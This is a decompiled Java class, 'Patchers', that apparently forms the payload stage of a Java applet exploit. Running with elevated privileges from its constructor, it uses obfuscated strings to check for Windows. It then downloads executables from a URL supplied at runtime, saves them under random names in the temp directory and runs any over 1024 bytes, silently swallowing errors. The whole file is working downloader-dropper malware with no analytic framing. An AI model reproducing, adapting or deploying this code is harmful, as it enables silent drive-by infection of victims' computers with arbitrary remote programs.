// 
// Decompiled by Procyon v0.5.30
// 

package lorry;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Patchers implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        final int n = 2;
        final byte[] array = new byte[s.length() / n];
        final int n2 = 16;
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
        }
        return array;
    }
    
    public Object run() throws Exception {
        if (Patchers.data == null) {
            return null;
        }
        try {
            if (System.getProperty("oBs.Bname".replace("B", "")).indexOf("W33333i333ndows".replace("3", "")) == -1) {
                return null;
            }
            int int1 = 1;
            if (Patchers.cc != null) {
                int1 = Integer.parseInt(Patchers.cc);
            }
            for (int i = 0; i < int1; ++i) {
                final URL url = new URL(Patchers.data + Integer.toString(i));
                url.openConnection();
                final InputStream openStream = url.openStream();
                final String string = System.getProperty("8888j88av8a888.88io8.tmp888d8i88r8888".replace("8", "")) + File.separator + Math.random() + ".exe".replace("0", "");
                final FileOutputStream fileOutputStream = new FileOutputStream(string);
                int n = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    fileOutputStream.write(read);
                    ++n;
                }
                openStream.close();
                fileOutputStream.close();
                this.Caller(n, string);
            }
        }
        catch (Exception ex) {}
        return null;
    }
    
    private void Caller(final int n, final String s) throws Exception {
        final Runtime runtime = Runtime.getRuntime();
        Boolean b = false;
        if (n >= 1024) {
            b = true;
        }
        if (b) {
            this.ef(runtime, s);
        }
    }
    
    private Process ef(final Runtime runtime, final String s) throws Exception {
        return runtime.exec(s, null, null);
    }
    
    public Patchers() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    static {
        Patchers.data = null;
        Patchers.cc = null;
    }
}
